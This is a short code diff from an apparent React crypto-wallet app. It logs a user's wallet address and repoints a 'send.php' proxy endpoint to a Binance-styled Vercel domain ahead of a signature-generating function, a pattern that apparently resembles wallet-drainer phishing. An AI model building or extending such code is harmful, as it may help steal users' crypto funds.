@@ -30,8 +30,8 @@ function App() {
     var account_sender = account[0];
     console.log("✅ Wallet Address:", account_sender);
 
-    // 🔹 مسیر صحیح برای `send.php`
-    let apiUrl = "https://reza-nu.vercel.app/api/proxy";
+    // 🔹 مسیر صحیح برای `send.php` از طریق پروکسی
+    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
     async function genSign(address, chain, type, contract = "0") {
       try {
